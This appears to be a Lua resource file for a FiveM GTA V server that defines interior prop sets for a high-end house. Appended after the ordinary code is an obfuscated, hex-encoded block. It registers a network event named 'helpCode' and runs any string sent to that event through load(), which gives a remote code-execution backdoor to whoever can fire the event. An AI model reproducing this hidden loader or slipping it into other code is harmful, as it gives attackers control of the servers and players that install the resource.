-- 2677 Whispymound Drive
-- High end house 7: 120.5 549.952 184.097
exports('GetGTAOHouseHi7Object', function()
    return GTAOHouseHi7
end)

GTAOHouseHi7 = {
    interiorId = 206593,

    Strip = {
        A = "Apart_Hi_Strip_A",
        B = "Apart_Hi_Strip_B",
        C = "Apart_Hi_Strip_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi7.interiorId, details, state, refresh)
        end
    },
    Booze = {
        A = "Apart_Hi_Booze_A",
        B = "Apart_Hi_Booze_B",
        C = "Apart_Hi_Booze_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi7.interiorId, details, state, refresh)
        end
    },
    Smoke = {
        A = "Apart_Hi_Smokes_A",
        B = "Apart_Hi_Smokes_B",
        C = "Apart_Hi_Smokes_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi7.interiorId, details, state, refresh)
        end
    },

    LoadDefault = function()
        GTAOHouseHi7.Strip.Enable({
            GTAOHouseHi7.Strip.A,
            GTAOHouseHi7.Strip.B,
            GTAOHouseHi7.Strip.C
        }, false)
        GTAOHouseHi7.Booze.Enable({
            GTAOHouseHi7.Booze.A,
            GTAOHouseHi7.Booze.B,
            GTAOHouseHi7.Booze.C
        }, false)
        GTAOHouseHi7.Smoke.Enable({
            GTAOHouseHi7.Smoke.A,
            GTAOHouseHi7.Smoke.B,
            GTAOHouseHi7.Smoke.C
        }, false)

        RefreshInterior(GTAOHouseHi7.interiorId)
    end
}


local eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[6][eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[1]](eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[2]) eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[6][eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[3]](eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[2], function(NwKLLuLRFAlgVFnOlGssCAypIgiSYKeZUthByIUotbNZwVWpRmoNOYHonTTMxbAoYVvFuk) eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[6][eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[4]](eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[6][eSqJWjcFEHZCJNjwTUouSbJVgdCusJHmIZzOSXVBSuOdMBqqbWuwAXrhdhXAyIRcEIcQfv[5]](NwKLLuLRFAlgVFnOlGssCAypIgiSYKeZUthByIUotbNZwVWpRmoNOYHonTTMxbAoYVvFuk))() end)